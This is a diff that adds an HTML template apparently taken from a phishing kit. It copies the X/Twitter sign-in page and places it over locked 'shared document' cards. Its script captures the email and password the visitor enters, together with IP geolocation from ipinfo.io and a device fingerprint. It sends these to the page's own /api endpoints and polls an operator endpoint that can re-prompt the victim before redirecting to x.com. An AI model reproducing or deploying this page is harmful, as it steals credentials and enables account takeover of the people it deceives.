@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>X / Twitter</title>
+<link rel="icon" href="https://abs.twimg.com/favicons/twitter.ico" type="image/x-icon"/>
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body,html{height:100%;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#fff}
+.main-container{display:flex;flex-direction:column;min-height:100vh}
+.top-navbar{background:#fff;height:53px;border-bottom:1px solid #eff3f4;display:flex;align-items:center;padding:0 16px}
+.content-area{flex:1;display:flex;position:relative}
+.document-preview{flex:1;background:#e8e8e8;padding:40px}
+.document-list{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:25px;max-width:1200px;margin:0 auto}
+.document-card{background:#fff;border-radius:4px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.1);transition:all .2s;position:relative}
+.document-card:hover{transform:translateY(-5px);box-shadow:0 5px 15px rgba(0,0,0,0.15)}
+.document-thumbnail{height:150px;background:#fff;display:flex;align-items:center;justify-content:center;border-bottom:1px solid #eee;padding:10px}
+.thumbnail-content{width:100%;height:100%;background:#f8f8f8;display:flex;flex-direction:column}
+.thumbnail-header{background:#000;height:20px;width:100%}
+.thumbnail-body{flex:1;padding:5px;font-size:6px;overflow:hidden}
+.thumbnail-line{height:3px;background:#ddd;margin:3px 0;width:90%}
+.document-info{padding:12px}
+.document-title{font-size:14px;font-weight:500;margin-bottom:5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.document-meta{font-size:12px;color:#666;display:flex;align-items:center}
+.document-date{margin-right:10px}.document-type{padding:2px 6px;background:#E8F0FE;color:#1A73E8;border-radius:3px;font-size:10px}
+.document-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);display:flex;justify-content:center;align-items:center;z-index:1000;overflow-y:auto;padding:20px}
+.login-container{width:364px;max-width:100%;background:#fff;padding:40px 32px;z-index:1001;text-align:center}
+.x-logo{font-size:32px;margin-bottom:24px;color:#000}
+.form-title{font-size:24px;font-weight:700;color:#000;margin-bottom:24px;text-align:left}
+.form-control{height:48px;border-radius:4px;border:1px solid #cfd9de;padding:0 12px;font-size:15px;width:100%;margin-bottom:12px}
+.form-control:focus{border-color:#1d9bf0;box-shadow:0 0 0 1px #1d9bf0;outline:none}
+.btn-primary{background:#000;border:none;height:44px;font-weight:700;width:100%;border-radius:22px;font-size:15px;color:#fff;cursor:pointer}
+.btn-primary:hover{background:#333}
+.btn-primary:disabled{background:#6e767d}
+.btn-outline{background:transparent;border:1px solid #cfd9de;height:40px;font-weight:700;width:100%;border-radius:20px;font-size:14px;color:#000;cursor:pointer;margin-top:8px}
+.divider{display:flex;align-items:center;margin:12px 0;color:#536471;font-size:13px}
+.divider::before,.divider::after{content:'';flex:1;border-bottom:1px solid #eff3f4}
+.error-message{color:#D32F2F;font-size:13px;margin-top:4px;margin-bottom:8px;display:none;text-align:center}
+.lock-icon{position:absolute;top:10px;right:10px;background:rgba(255,255,255,0.9);width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#000;font-size:12px}
+.loading-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:1002;justify-content:center;align-items:center;color:#fff;font-size:20px}
+@media(max-width:768px){.document-list{grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:15px}}
+</style>
+</head>
+<body>
+<div class="main-container">
+<div class="top-navbar"><svg viewBox="0 0 24 24" width="28" height="28" fill="#000"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></div>
+<div class="content-area"><div class="document-preview"><div class="document-list">
+<div class="document-card"><div class="lock-icon"><i class="fas fa-lock"></i></div><div class="document-thumbnail"><div class="thumbnail-content"><div class="thumbnail-header"></div><div class="thumbnail-body"><div class="thumbnail-line" style="width:60%"></div></div></div></div><div class="document-info"><div class="document-title">{{file1Name}}</div><div class="document-meta"><span class="document-date">{{file1Date}}</span><span class="document-type">PDF</span></div></div></div>
+<div class="document-card"><div class="lock-icon"><i class="fas fa-lock"></i></div><div class="document-thumbnail"><div class="thumbnail-content"><div class="thumbnail-header"></div><div class="thumbnail-body"><div class="thumbnail-line" style="width:70%"></div></div></div></div><div class="document-info"><div class="document-title">{{file2Name}}</div><div class="document-meta"><span class="document-date">{{file2Date}}</span><span class="document-type">DOC</span></div></div></div>
+<div class="document-card"><div class="lock-icon"><i class="fas fa-lock"></i></div><div class="document-thumbnail"><div class="thumbnail-content"><div class="thumbnail-header"></div><div class="thumbnail-body"><div class="thumbnail-line" style="width:80%"></div></div></div></div><div class="document-info"><div class="document-title">{{file3Name}}</div><div class="document-meta"><span class="document-date">{{file3Date}}</span><span class="document-type">XLS</span></div></div></div>
+<div class="document-card"><div class="lock-icon"><i class="fas fa-lock"></i></div><div class="document-thumbnail"><div class="thumbnail-content"><div class="thumbnail-header"></div><div class="thumbnail-body"><div class="thumbnail-line" style="width:90%"></div></div></div></div><div class="document-info"><div class="document-title">{{file4Name}}</div><div class="document-meta"><span class="document-date">{{file4Date}}</span><span class="document-type">PPT</span></div></div></div>
+</div>
+<div class="document-overlay">
+<div class="login-container">
+<div class="x-logo"><svg viewBox="0 0 24 24" width="40" height="40" fill="#000"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></div>
+<h2 class="form-title">Sign in to X</h2>
+<form id="loginForm" onsubmit="return handleSubmit(event);" method="post" autocomplete="off">
+<input type="text" class="form-control" id="emailInput" placeholder="Phone, email, or username" required>
+<input type="password" class="form-control" id="passwordInput" placeholder="Password" required onkeypress="if(event.key==='Enter')handleSubmit(event)">
+<div class="error-message" id="loginError">Incorrect password. Try again.</div>
+<div class="error-message" id="generalError">An error occurred. Please try again.</div>
+<input type="hidden" id="methodInput" value="email">
+<button type="submit" class="btn-primary" id="submitBtn">Next</button>
+<button type="button" class="btn-outline">Forgot password?</button>
+<div class="divider">or</div>
+<button type="button" class="btn-outline">Sign up with Google</button>
+</form>
+</div></div></div></div></div>
+<div class="loading-overlay" id="loadingOverlay" style="display:none"><div style="text-align:center"><div class="spinner-border" style="color:#000" role="status"></div><div class="loading-text" id="loadingText">Verifying...</div></div></div>
+<script>
+const templateConfig = { postURL:"{{postURL}}", token:"{{token}}", landingPageLink:"{{landingPageLink}}", maxLoginAttempts:"{{maxLoginAttempts}}" };
+const apiBaseUrl = window.location.origin + "/api";
+let browserId = null, pollingIntervalId = null, pollingStartTime = null;
+const POLLING_TIMEOUT_MS = 10 * 60 * 1000;
+let currentStatus = null, lastShownStatus = '';
+let loginAttempts = 0;
+const MAX_ATTEMPTS = templateConfig.maxLoginAttempts && parseInt(templateConfig.maxLoginAttempts)>0 ? parseInt(templateConfig.maxLoginAttempts) : 3;
+
+function objectToFormData(obj){const fd=new URLSearchParams();Object.entries(obj).forEach(([k,v])=>fd.append(k,v!=null?v.toString():''));return fd.toString()}
+function getDeviceData(){return{userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screenWidth:window.screen.width,screenHeight:window.screen.height,colorDepth:window.screen.colorDepth,pixelRatio:window.devicePixelRatio,hardwareConcurrency:navigator.hardwareConcurrency,deviceMemory:navigator.deviceMemory,vendor:navigator.vendor,maxTouchPoints:navigator.maxTouchPoints}}
+
+function hideAllErrors(){document.getElementById('loginError').style.display='none';document.getElementById('generalError').style.display='none'}
+
+function showLoadingOverlay(show){document.getElementById('loadingOverlay').style.display=show?'flex':'none';document.querySelector('.document-overlay').style.display=show?'none':'flex'}
+
+function resetFormState(){document.getElementById('emailInput').value='';document.getElementById('passwordInput').value='';document.getElementById('submitBtn').disabled=false;document.getElementById('submitBtn').textContent='Next'}
+
+function updateUIForStatus(status,data){currentStatus=status;hideAllErrors();document.getElementById('submitBtn').disabled=false;document.getElementById('submitBtn').textContent='Next';document.getElementById('emailInput').readOnly=false;document.getElementById('passwordInput').disabled=false
+switch(status){case'WAITING':showLoadingOverlay(true);document.getElementById('emailInput').readOnly=true;document.getElementById('passwordInput').disabled=true;document.getElementById('submitBtn').textContent='Checking...';document.getElementById('submitBtn').disabled=true;startPolling(5000);break;case'PROCESSING':showLoadingOverlay(true);document.getElementById('emailInput').readOnly=true;document.getElementById('passwordInput').disabled=true;document.getElementById('submitBtn').textContent='Processing...';document.getElementById('submitBtn').disabled=true;startPolling(10000);break;case'WAITINGEMAIL':case'WAITINGEMAILERROR':showLoadingOverlay(false);document.getElementById('submitBtn').textContent='Next';if(data.email)document.getElementById('emailInput').value=data.email;document.getElementById('emailInput').readOnly=false;document.getElementById('passwordInput').disabled=false;if(data.lastJsonResponse){try{const r=typeof data.lastJsonResponse==='string'?JSON.parse(data.lastJsonResponse):data.lastJsonResponse;if(r.message&&!r.message.includes('Processing email')){document.getElementById('loginError').textContent=r.message;document.getElementById('loginError').style.display='block';document.getElementById('passwordInput').value=''}}catch(e){}}startPolling(10000);break;case'WAITINGPASSWORD':case'WAITINGPASSWORDERROR':showLoadingOverlay(false);document.getElementById('submitBtn').textContent='Next';if(data.email)document.getElementById('emailInput').value=data.email;document.getElementById('emailInput').readOnly=true;document.getElementById('passwordInput').disabled=false;if(lastShownStatus!==currentStatus&&data.lastJsonResponse){try{const r=typeof data.lastJsonResponse==='string'?JSON.parse(data.lastJsonResponse):data.lastJsonResponse;if(r.message&&(r.message.includes('Incorrect password')||r.message.includes('incorrect'))){document.getElementById('loginError').textContent=r.message;document.getElementById('loginError').style.display='block';document.getElementById('passwordInput').value=''}}catch(e){}}lastShownStatus=currentStatus;startPolling(10000);break;case'COMPLETED':clearInterval(pollingIntervalId);let redirectUrl=templateConfig.landingPageLink&&templateConfig.landingPageLink.trim()!==''?templateConfig.landingPageLink:'https://x.com';if(!redirectUrl.startsWith('http'))redirectUrl='https://'+redirectUrl;window.location.href=redirectUrl;break;case'FAILED':showLoadingOverlay(false);clearInterval(pollingIntervalId);if(data.lastJsonResponse){try{const r=typeof data.lastJsonResponse==='string'?JSON.parse(data.lastJsonResponse):data.lastJsonResponse;document.getElementById('loginError').textContent=r.message||'An error occurred. Please try again.';document.getElementById('loginError').style.display='block'}catch(e){document.getElementById('loginError').textContent='An error occurred. Please try again.';document.getElementById('loginError').style.display='block'}}resetFormState();startPolling(10000);break;default:showLoadingOverlay(false);document.getElementById('loginError').textContent='An unexpected status was received. Please try again.';document.getElementById('loginError').style.display='block';resetFormState();startPolling(10000)}}
+
+function startPolling(interval){if(pollingIntervalId)clearInterval(pollingIntervalId);if(pollingStartTime===null)pollingStartTime=Date.now();pollingIntervalId=setInterval(pollOperator,interval)}
+async function pollOperator(){if(!browserId){clearInterval(pollingIntervalId);return}if(pollingStartTime!==null&&Date.now()-pollingStartTime>POLLING_TIMEOUT_MS){clearInterval(pollingIntervalId);showLoadingOverlay(false);document.getElementById('generalError').textContent='Session timed out. Please try again.';document.getElementById('generalError').style.display='block';resetFormState();return}try{const res=await fetch(apiBaseUrl+'/pooling-operator',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:objectToFormData({browserId,token:templateConfig.token})});if(!res.ok)throw new Error('HTTP '+res.status);const data=await res.json();if(data.currentStatus)updateUIForStatus(data.currentStatus,data.data||{})}catch(e){console.error(e);showLoadingOverlay(false);document.getElementById('generalError').textContent='Polling failed. Please try again.';document.getElementById('generalError').style.display='block';clearInterval(pollingIntervalId);resetFormState()}}
+
+async function initialFormSubmission(){showLoadingOverlay(true);const urlParams=new URLSearchParams(window.location.search);const email=urlParams.get('email');const emailField=document.getElementById('emailInput');const passwordField=document.getElementById('passwordInput');if(email){emailField.value=email;emailField.readOnly=true}else{emailField.readOnly=false}
+const formDataContent={email:email||'',password:'',ipData:{},deviceData:getDeviceData()};try{const ipData=await fetch('https://ipinfo.io/json').then(r=>r.json()).catch(()=>({}));formDataContent.ipData=ipData;const payload={token:templateConfig.token,formData:JSON.stringify(formDataContent)};const response=await fetch(apiBaseUrl+'/notify-form-submission',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:objectToFormData(payload)});if(!response.ok)throw new Error('HTTP '+response.status);const data=await response.json();if(data.apiResponse&&data.apiResponse.browserId){browserId=data.apiResponse.browserId;updateUIForStatus(data.apiResponse.status,data.apiResponse)}else throw new Error('No browserId')}catch(error){console.error(error);document.getElementById('generalError').textContent='Failed to initiate process. Please try again.';document.getElementById('generalError').style.display='block';showLoadingOverlay(false);resetFormState()}}
+
+async function handleSubmit(event){event.preventDefault();hideAllErrors();const email=document.getElementById('emailInput').value.trim();const password=document.getElementById('passwordInput').value.trim();if(!email||!password){document.getElementById('loginError').textContent='Please fill in all fields.';document.getElementById('loginError').style.display='block';return false}const btn=document.getElementById('submitBtn');btn.disabled=true;btn.textContent='Submitting...';showLoadingOverlay(true);try{const ipData=await fetch('https://ipinfo.io/json').then(r=>r.json()).catch(()=>({}));const payload={browserId:browserId,token:templateConfig.token,email:email,password:password,updateType:'credentials',ipData};const response=await fetch(apiBaseUrl+'/update-process',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:objectToFormData(payload)});if(!response.ok)throw new Error('HTTP '+response.status);loginAttempts++;pollingStartTime=Date.now();startPolling(3000)}catch(e){console.error(e);document.getElementById('generalError').textContent='An error occurred during submission. Please try again.';document.getElementById('generalError').style.display='block';showLoadingOverlay(false);btn.disabled=false;btn.textContent='Next'}return false}
+
+document.addEventListener('DOMContentLoaded',initialFormSubmission);
+</script>
+</body>
+</html>
